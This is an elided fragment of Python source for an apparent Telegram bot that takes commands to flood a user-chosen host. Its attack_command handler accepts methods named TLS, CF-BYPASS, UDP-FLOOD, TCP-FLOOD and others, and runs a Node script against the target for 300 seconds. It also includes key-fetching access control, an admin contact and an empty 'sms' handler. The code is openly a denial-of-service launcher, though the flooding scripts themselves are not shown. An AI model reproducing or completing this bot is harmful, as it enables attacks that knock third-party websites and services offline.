...
allowed_group_id = -1002731199617
...
def laykey(message):
    ...
    try:
        response = requests.get(f'https://hoangtapcode123.github.io/showkey/?key=qkhaidz')
...
def attack_command(message):
    ...
    if method in ['TLS', 'GOD', 'VIP', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
        ...
        if method == 'VIP':
            command = ["node", "vipok.js", host, "300", "16", "7"]
            duration = 300
        if method == 'TLS':
...
def send_admin_link(message):
    bot.reply_to(message, "Telegram: t.me/qkdzvcl206")
@bot.message_handler(commands=['sms'])
def sms(message):
    pass
